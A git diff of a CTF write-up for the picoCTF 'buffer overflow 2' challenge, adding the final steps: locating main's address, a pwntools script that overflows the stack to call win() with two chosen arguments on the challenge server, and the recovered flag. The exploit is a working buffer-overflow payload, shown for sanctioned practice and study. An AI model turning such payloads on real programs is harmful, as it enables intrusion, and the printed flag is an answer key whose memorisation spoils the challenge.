@@ -3,7 +3,7 @@
 ## DESCRIPTION:
 Control the return address and arguments This time you'll need to control the arguments to the function you return to! 
 Can you get the flag from this [program?](https://github.com/jon-brandy/CTF-WRITE-UP/blob/f4988ca3e1525733628e10f39c3873e83589c97f/Asset/buffer%20overflow%202/vuln) 
-You can view source [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/f4988ca3e1525733628e10f39c3873e83589c97f/Asset/buffer%20overflow%202/vuln.c). And connect with it using `nc saturn.picoctf.net 53709`.
+You can view source [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/f4988ca3e1525733628e10f39c3873e83589c97f/Asset/buffer%20overflow%202/vuln.c). And connect with it using `nc saturn.picoctf.net 62608`.
 ## HINT:
 1. Try using GDB to print out the stack once you write to it.
 ## STEPS:
@@ -154,8 +154,54 @@ the NOPs which will “execute” until the payload (usually shellcode) is encou
 
 ![image](https://user-images.githubusercontent.com/70703371/188071195-84200e05-dbb6-4d4e-a52f-11bb03a218ae.png)
 
-19.
+19. Next we need to fint the address of the main function too, because after we called the `win()` function, following it at the stack is going to be the return address for that function. So for the safe way to do this i add the address for the main function for the payload.
 
+> MAIN FUNCTION'S ADDRESS
+
+![image](https://user-images.githubusercontent.com/70703371/188077884-95401326-e39c-49fb-95de-b5d6a9be183e.png)
+
+20. For the final solution, i made a script in python using **pwntools**:
+
+> PAYLOAD.PY
+
+```py
+import os
+from pwn import *
+
+os.system('clear')
+
+arg1 = 0xCAFEF00D
+arg2 = 0xF00DF00D
+win = 0x8049296
+main = 0x8049372
+
+sh = remote('saturn.picoctf.net', 62805)
+
+sh.recvuntil('\n')
+p = b'A' * 112 
+p += p32(134517398) # the win function decimal
+p += p32(134517618) # the main function decimal
+p += p32(3405705229) # arg1 decimal representation
+p += p32(4027445261) # arg2 decimal representation
+
+sh.sendline(p)
+
+sh.interactive()
+
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/188078068-83fb7997-2fc2-4d7b-a6db-3bbc30f7282e.png)
+
+
+21. Finally we got the flag!
+
+## FLAG
+
+```
+picoCTF{argum3nt5_4_d4yZ_31432deb}
+```
 ## REFERENCES:
 
 ```
